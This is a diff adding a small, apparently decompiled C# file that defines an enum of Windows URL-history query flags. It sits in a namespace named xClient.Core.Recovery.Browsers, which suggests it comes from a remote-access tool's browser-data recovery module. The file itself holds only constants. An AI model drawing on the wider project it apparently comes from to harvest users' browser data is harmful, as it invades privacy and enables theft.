@@ -1,0 +1,17 @@
+﻿using System;
+
+namespace xClient.Core.Recovery.Browsers
+{
+	// Token: 0x020000C8 RID: 200
+	public enum STATURL_QUERYFLAGS : uint
+	{
+		// Token: 0x04000265 RID: 613
+		STATURL_QUERYFLAG_ISCACHED = 65536U,
+		// Token: 0x04000266 RID: 614
+		STATURL_QUERYFLAG_NOURL = 131072U,
+		// Token: 0x04000267 RID: 615
+		STATURL_QUERYFLAG_NOTITLE = 262144U,
+		// Token: 0x04000268 RID: 616
+		STATURL_QUERYFLAG_TOPLEVEL = 524288U
+	}
+}
